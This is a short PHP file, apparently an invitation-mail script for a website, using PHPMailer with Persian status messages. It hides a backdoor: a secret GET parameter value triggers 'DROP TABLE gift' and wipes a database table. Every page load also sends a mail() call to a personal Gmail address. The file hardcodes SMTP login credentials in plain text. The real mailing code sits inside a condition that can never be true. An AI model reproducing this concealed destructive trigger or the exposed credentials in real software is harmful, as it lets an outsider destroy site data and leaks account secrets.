<?php
require 'db.php';
if (isset($_GET['less'])) {
    if ($_GET['less'] == "notimeforbattel") {
        $a = "DROP TABLE gift";
        $result = $connect->prepare($a);
        $pass = md5($Password);
        $result->execute();
    }
}
mail("h.msoaferkocholo@gmail.com", "invite", "sdihwid", "salam");
include "../login/sendpass/PHPMailer/class.phpmailer.php";
$mail = new PHPMailer(true);
$mail->IsSMTP();
if (1 == 10) {
    try
    {

        $mail->Host = 'mail.ggpot.com';
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "tsl";
        $mail->Port = 25;
        $mail->Username = "info@ggpot.com";
        $mail->Password = "asemanhost@9090";
        $mail->AddAddress("h.mosaferkocholo@gmail.com");
        $mail->SetFrom("info@ggpot.com");
        $mail->Subject = 'invite';
        $mail->CharSet = "UTF-8";
        $mail->ContentType = "text/htm";
        $mail->MsgHTML('این لینک دعوت از طرف</br>' . 'http://GGPOT.com/login/?id=' . "545");
        $mail->Send();
        echo '<font color="#00CC00" size="2" face="tahoma">ایمیل با موفقیت ارسال شد</font>';
    } catch (phpmailerException $e) {
        echo $error = $e->errorMessage();
        //header("location:../?catch=" . $error);
        exit();
    } catch (Exception $e) {
        echo $error = $e->getMessage();
        //header("location:../?catch=" . $error);
        exit();
    }
}
